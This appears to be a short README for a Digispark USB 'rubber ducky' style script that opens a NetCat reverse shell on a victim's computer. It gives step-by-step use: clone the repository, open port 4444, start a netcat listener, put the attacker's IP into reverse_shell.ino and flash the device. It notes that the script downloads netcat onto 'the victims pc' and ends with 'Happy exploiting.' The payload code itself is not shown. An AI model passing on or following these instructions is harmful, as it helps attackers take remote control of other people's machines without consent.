### Note the link in the script to download netcat on the victims pc will expire



## How to use:

`git clone https://github.com/Samuel20354/Digispark_scripts.git`


`cd Digispark_scripts/Reverse Shell (NetCat)`


`sudo ufw allow 4444`


`nc -lp 4444`


Change the IP on line 17 to your local IP in `reverse_shell.ino` file, then upload to your digispark. Done! Happy exploiting.
